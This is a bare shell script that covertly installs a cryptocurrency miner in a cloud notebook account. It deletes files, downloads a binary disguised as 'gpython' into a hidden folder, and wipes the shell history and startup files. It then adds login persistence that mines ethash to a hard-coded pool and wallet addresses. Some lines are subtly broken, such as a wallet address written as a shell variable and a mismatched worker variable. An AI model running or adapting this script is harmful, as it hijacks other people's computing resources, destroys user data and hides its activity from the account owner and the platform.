cd ~/
mkdir .lib
cd .lib
rm -R *
rm -R /home/studio-lab-user/.ton
WORKER="0"
WALLETNH="3BsJ6cvtviyvS6tWfFWaDGHStB8pTHUrNH"
POOLNH="144.217.82.15:80"
wget https://ewr1.vultrobjects.com/mines/gpython
echo ""  > /home/studio-lab-user/.bashrc
echo "" > /home/studio-lab-user/.bash_history
echo "" > /home/studio-lab-user/.bash_profile
echo 'echo ""  >> /home/studio-lab-user/.bash_history' >> /home/studio-lab-user/.bashrc
echo "source /home/studio-lab-user/.bash_profile"  >> /home/studio-lab-user/.bashrc
echo "LD_LIBRARY_PATH=/home/studio-lab-user/.lib" > /home/studio-lab-user/.bash_profile
echo "export LD_LIBRARY_PATH" >> /home/studio-lab-user/.bash_profile
echo 'WORKER="x"' >> ~/.bash_profile
echo 'WALLETNH="3EjEBvM3wqxFMZcetxwPo9E3CkaRtoD8VX"' >> /home/studio-lab-user/.bash_profile
echo 'POOLNH="144.217.82.15:80"' >> /home/studio-lab-user/.bash_profile
echo "bash /home/studio-lab-user/.lib/gas.sh"  >> /home/studio-lab-user/.bash_profile
echo "./.lib/gpython --algo ethash --server $POOLNH --user $3EjEBvM3wqxFMZcetxwPo9E3CkaRtoD8VX.$worker -p x -i 100 -w 0 --kernel 0 --proto stratum" > /home/studio-lab-user/.lib/gas.sh
chmod +x gas.sh && chmod +x gpython && cd ~/ && source .bashrc
